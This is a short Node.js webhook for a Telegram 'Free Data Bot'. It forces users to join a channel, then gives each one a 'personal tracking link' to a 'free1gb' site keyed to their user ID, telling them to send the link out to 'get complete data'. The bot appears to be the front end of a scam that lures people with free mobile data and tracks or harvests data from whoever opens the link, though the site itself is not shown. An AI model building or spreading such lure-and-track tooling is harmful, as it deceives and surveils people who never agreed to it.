const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBSITE_URL = process.env.WEBSITE_URL || 'https://free1gb.vercel.app';

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const update = req.body;

    if (update.message && update.message.text === '/start') {
      const chatId = update.message.chat.id;
      const userId = update.message.from.id;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "📢 Join Channel 1", url: "https://t.me/sg_modder1" },
            { text: "📢 Join Channel 2", url: "https://t.me/sg_modder1" }
          ],
          [
            { text: "✅ I Have Joined", callback_data: "verify_join" }
          ]
        ]
      };
      
      await bot.sendMessage(chatId, 
        `🎉 *Welcome to Free Data Bot!*\n\nGet your personal tracking link!`,
        { parse_mode: 'Markdown', reply_markup: keyboard }
      );
    }
    
    if (update.callback_query?.data === 'verify_join') {
      const chatId = update.callback_query.message.chat.id;
      const userId = update.callback_query.from.id;
      const personalLink = `${WEBSITE_URL}?id=${userId}`;
      
      await bot.sendMessage(chatId,
        `✅ *Your Personal Link:*\n\`${personalLink}\`\n\nSend this link to get complete data!`,
        { parse_mode: 'Markdown' }
      );
    }

    if (update.callback_query) {
      await bot.answerCallbackQuery(update.callback_query.id);
    }
    
    res.status(200).json({ status: 'OK' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};
